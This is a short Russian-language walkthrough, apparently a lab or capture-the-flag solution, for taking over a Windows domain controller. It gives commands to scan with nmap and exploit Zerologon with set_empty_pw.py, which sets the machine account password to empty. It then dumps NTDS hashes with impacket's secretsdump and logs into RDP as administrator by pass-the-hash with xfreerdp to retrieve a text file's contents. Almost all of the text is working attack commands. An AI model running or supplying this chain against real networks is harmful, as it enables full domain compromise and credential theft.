1.1. Сканируем сеть, узнаём ip-адрес контроллера домена и имя домена. <br>
sudo nmap --script whois-domain.nse 192.168.0.0/16 <br>
2.1. Скачиваем инструмент для zerologon <br>
git clone https://github.com/risksense/zerologon (может уже скачан у пользователя?) <br>
В Readme будет хорошее описание команды. <br>
2.2. Сделаем пароль таким, чтобы его хэш был равен: 31d6cfe0d16ae931b73c59d7e0c089c0 <br>
python3 set_empty_pw.py [domainname] [ipaddr] <br>
Где domainname – имя домена; <br>
Ipaddr – устройства, к которому подключаемся <br>
2.3. Воспользуемся новым паролем для дампа ntds: <br>
git clone https://github.com/SecureAuthCorp/impacket (может уже скачан у пользователя?) <br>
cd impacket/examples <br>
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '[DOMAIN]/[DC_NETBIOS_NAME]$@[dc_ip_addr]' <br>
где DOMAIN – имя домена <br>
DC_NETBIOS_NAME – имя устройства, который атакуем <br>
dc_ip_addr – ip-адрес устройства, который атакуем <br>
Получаем NT-хэши, в частности и администратора. <br>
3.1. Подключимся по RDP: <br>
Шаблон команды: xfreerdp /d:[domainname] /u:[username] /v:[ipaddr] /pth:[NTHASH] <br>
Где domainname – имя домена; <br>
Username – логин администратора <br>
Ipaddr – устройства, к которому подключаемся <br>
NTHASH – NT(LM)-хэш пользователя <br>
Заходим на рабочий стол и копируем содержимое txt файла в ответ.
